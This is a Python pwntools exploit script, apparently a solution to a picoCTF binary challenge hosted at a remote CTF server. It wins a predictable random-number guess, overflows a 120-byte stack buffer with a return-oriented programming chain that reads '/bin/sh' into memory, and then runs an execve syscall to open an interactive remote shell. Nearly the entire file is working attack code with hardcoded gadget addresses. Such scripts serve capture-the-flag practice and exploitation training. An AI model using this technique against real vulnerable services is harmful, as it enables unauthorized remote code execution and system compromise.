from pwn import *

#p = process("./vuln")
#gdb.attach(p)

p = remote("jupiter.challenges.picoctf.org", 51462)

#if no seed for rand - default 1 (same sequence every time)

p.recvuntil(b"guess?")
p.sendline(b"84")

pop_rdi = 0x400696
pop_rsi = 0x410ca3
pop_rax = 0x4163f4
pop_rdx = 0x44cc26
ret = 0x400416
syscall = 0x40137c

main = 0x400c8c
empty_address = 0x6b7f12
read_func = 0x44a6a0

# read "/bin/sh\x00" into an address
# requires rdi = 0 for stdin, rsi = address to write to and rdx = 9 for length
payload = b"A"*120 # correct
payload += p64(pop_rdi)
payload += p64(0x0)
payload += p64(pop_rsi)
payload += p64(empty_address)
payload += p64(pop_rdx)
payload += p64(0x9)
payload += p64(read_func)
payload += p64(main)

p.recvuntil(b"Name?")
p.sendline(payload)

input("just waiting a little, press any key to continue")

p.sendline(b"/bin/sh\x00") # into empty address

p.recvuntil(b"guess?")
p.sendline(b"87") # found in gdb again

# calling execve(/bin/sh, \x00, \x00) to get a shell - checked chromium docs

final_payload = b"A"*120
final_payload += p64(pop_rax)
final_payload += p64(0x3b)
final_payload += p64(pop_rdi)
final_payload += p64(empty_address)
final_payload += p64(pop_rdx)
final_payload += p64(0x0)
final_payload += p64(pop_rsi)
final_payload += p64(0x0)
final_payload += p64(syscall)

p.recvuntil(b"Name?")
p.sendline(final_payload)

p.interactive()